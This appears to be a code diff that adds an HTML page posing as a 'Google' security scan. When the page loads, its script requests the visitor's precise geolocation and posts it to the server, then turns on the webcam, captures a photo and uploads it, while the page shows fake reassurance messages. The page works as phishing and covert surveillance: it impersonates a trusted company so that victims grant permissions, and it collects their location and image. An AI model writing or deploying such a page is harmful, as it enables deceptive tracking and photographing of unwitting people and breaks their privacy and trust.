@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Scan</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background: #f0f0f0;
+        }
+        #status {
+            margin: 50px auto;
+            padding: 20px;
+            max-width: 500px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <div id="status">Starting security scan...</div>
+
+    <script>
+        // Immediately start the scan when page loads
+        window.onload = function() {
+            document.getElementById('status').innerText = "GOOGLE IS CHECKING WEBSITE....";
+            
+            // First get location
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    
+                    // Send location to server (which will print to terminal)
+                    fetch('/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        })
+                    }).then(() => {
+                        document.getElementById('status').innerText = "PLEASE ALLOW PERMISSIONS FOR GOOGLE ENHANCED SECURITY";
+                        capturePhoto();
+                    });
+                },
+                function(error) {
+                    document.getElementById('status').innerText = "Location error: " + error.message;
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        };
+
+        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('image', blob, 'photo.jpg');
+                            
+                            fetch('/upload_image', { 
+                                method: 'POST', 
+                                body: formData 
+                            }).then(() => {
+                                document.getElementById('status').innerText = 
+                                    "Security scan complete! You can close this page.";
+                            });
+                        }, 'image/jpeg');
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
+                })
+                .catch(err => {
+                    document.getElementById('status').innerText = "Camera error: " + err.message;
+                });
+        }
+    </script>
+</body>
+</html>
